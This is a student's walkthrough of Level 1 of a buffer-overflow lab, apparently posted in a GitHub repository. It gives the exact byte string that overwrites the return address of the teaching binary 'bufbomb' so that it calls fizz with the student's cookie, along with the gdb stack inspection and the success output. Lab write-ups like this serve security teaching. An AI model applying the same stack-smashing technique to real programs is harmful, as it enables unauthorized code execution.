# Level 1: Sparkler	( Hai Dang )

Similar to Level 0, the task is to get BUFBOMB to execute the code for `fizz` rather 
than returning to `test`. In this case, we must pass my cookie (`0x2b9b4cfd`) as its argument
In order to implement it, we should understand how stack work when we call a function because
we need to know exactly where argument is stored in stack. You can read information about 
how stack works at [stack_operation](https://github.com/danghai/Security_Exploit/blob/master/bufbomb/note/Stack.pdf)

## Start: 

1. Similar to previous Level 0, we need to the code executing the `fizz` function. Therefore, 
Finding the address function `fizz` in BUFBOMB assembly

```
danghai@babbage:~/buflab-handout$ grep -i "fizz" assembly.txt
08048c9f <fizz>:
```
The address for `fizz` function = `0x08048c9f`

2. Get information fizz assembly and examine the stack

```
danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x44,"9f 8c 04 08 "'>hex2
danghai@babbage:~/buflab-handout$ ./hex2raw <hex2> raw2
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break *0x08048c9f
(gdb) run -u danghai <raw2
(gdb) disas
```
Assembly for `fizz` function:

```asm
Dump of assembler code for function fizz:
=> 0x08048c9f <+0>:	push   %ebp
   0x08048ca0 <+1>:	mov    %esp,%ebp
   0x08048ca2 <+3>:	sub    $0x18,%esp
   0x08048ca5 <+6>:	mov    0x8(%ebp),%eax
   0x08048ca8 <+9>:	cmp    0x804c1e4,%eax
   0x08048cae <+15>:	jne    0x8048cce <fizz+47>
   0x08048cb0 <+17>:	mov    %eax,0x4(%esp)
   0x08048cb4 <+21>:	movl   $0x8049f31,(%esp)
   0x08048cbb <+28>:	call   0x80488e0 <printf@plt>
   0x08048cc0 <+33>:	movl   $0x1,(%esp)
   0x08048cc7 <+40>:	call   0x80490e8 <validate>
   0x08048ccc <+45>:	jmp    0x8048cde <fizz+63>
   0x08048cce <+47>:	mov    %eax,0x4(%esp)
   0x08048cd2 <+51>:	movl   $0x804a11c,(%esp)
   0x08048cd9 <+58>:	call   0x80488e0 <printf@plt>
   0x08048cde <+63>:	movl   $0x0,(%esp)
   0x08048ce5 <+70>:	call   0x8048990 <exit@plt>
End of assembler dump.
```
From above assembly code, we realize that eax register take value 
at `%esp + 8`, and then it will compare this value to `0x804c1e4`. Therefore, 
we need to put the `cookie` at address `%esp + 8`. Specifically, 
the goal is to push the address of fizz onto the stack, place the cookie produced by the id `danghai` at the location 0x8(%ebp)

```
danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x44,"9f 8c 04 08 ","AA "x4,"fd 4c 9b 2b"'>hex2
danghai@babbage:~/buflab-handout$ ./hex2raw <hex2> exploit_1
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break *0x08048ca5     --> Instruction: mov    0x8(%ebp),%eax
(gdb) run -u danghai < exploit_1
(gdb) x/20x $ebp
```

Stack store: 
```asm
0x556830d4 <_reserved+1036500>:	0x61616161	0xaaaaaaaa	0x2b9b4cfd	0x55685f00
0x556830e4 <_reserved+1036516>:	0xf7e39046	0xf7fa0d60	0x08049fa2	0x5568310c
0x556830f4 <_reserved+1036532>:	0x5edd9ef1	0xf7f132c6	0x00000000	0x55685ff0
0x55683104 <_reserved+1036548>:	0x08048dd7	0x08049fa2	0x000000f4	0x00001fa0
0x55683114 <_reserved+1036564>:	0x00000000	0x00000000	0x00000000	0xf4f4f4f4
```

we can realize that at address `%ebp :0x556830d4` it stores 0x61616161, and then at address
`%ebp + 8`: it stores `0x2b9b4cfd` ( Cool! That is my cookie).

Run and see the result
```
danghai@babbage:~/buflab-handout$ gdb ./bufbomb -u danghai < exploit_1
``` 

Cool! Result is: 
```
Userid: danghai
Cookie: 0x2b9b4cfd
Type string:Fizz!: You called fizz(0x2b9b4cfd)
VALID
NICE JOB!
```

[NEXT LEVEL](https://github.com/danghai/Security_Exploit/blob/master/bufbomb/Exploit_2.md)




